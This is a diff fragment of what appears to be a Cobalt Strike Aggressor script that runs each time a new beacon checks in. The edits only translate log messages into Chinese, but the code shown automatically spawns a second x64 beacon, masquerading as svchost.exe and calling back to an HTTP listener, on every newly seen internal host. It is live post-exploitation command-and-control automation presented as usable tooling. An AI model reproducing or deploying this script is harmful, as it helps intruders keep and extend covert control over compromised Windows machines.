@@ -15,16 +15,16 @@ on beacon_initial {
  
         println($output);
 	 }
-	println("1a_list：".@a);
+	println("1a列表：".@a);
 	@b = @();
 	$internalIP = replace(beacon_info($1, "internal"), " ", "_");
 	add(@b,$internalIP)
-	println("1b_list：".@b);
+	println("1b列表：".@b);
 	foreach $c (@b){
 		if ($c in @a){
-			println("Exist!")
+			println("存在")
 		}else{
-			println("Spawning");
+			println("开始spawn");
 			bspawnto($1, "x64", "%windir%\\sysnative\\svchost.exe");
 			bspawn($1, "http", "x64");
 		}
@@ -35,7 +35,7 @@ on beacon_initial {
 	   #println("Bid: " . $beacon['internal'] . " is " . $beacon['pid']);
 	   add(@a,$beacon['internal'])
 	
-	println("2a_list：".@a);
+	println("2a列表：".@a);
  
  
 	}
